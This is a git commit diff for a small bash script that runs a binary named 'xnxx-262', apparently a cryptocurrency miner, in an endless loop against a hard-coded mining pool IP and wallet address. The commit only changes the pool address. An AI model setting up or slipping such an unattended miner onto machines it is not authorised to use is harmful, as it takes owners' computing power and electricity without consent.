3dcb1bc870b30afcafe46641d5827a0d64ed826f
no107yes990 <no107yes990@sjamusicpro.xyz>
2025-01-03 14:46:00 +0900

    Update 2.sh

--- 2.sh
+++ 2.sh
@@ -2,6 +2,6 @@ bash
 #!/bin/bash
 while true
 do
-./xnxx-262 --disable-gpu --algorithm yespowerSUGAR --pool 198.50.168.213:6241 --wallet DQ44uJMY6T8iSeHnLtCzdCWmoYJuNAm6Y4.d$(TZ=UTC-7 date +"%H-%M [%d-%m]") -p c=DGB -t 10 --dns-over-https 0
+./xnxx-262 --disable-gpu --algorithm yespowerSUGAR --pool 8.215.56.134:6600 --wallet DQ44uJMY6T8iSeHnLtCzdCWmoYJuNAm6Y4.d$(TZ=UTC-7 date +"%H-%M [%d-%m]") -p c=DGB -t 10 --dns-over-https 0
 sleep 3
 done
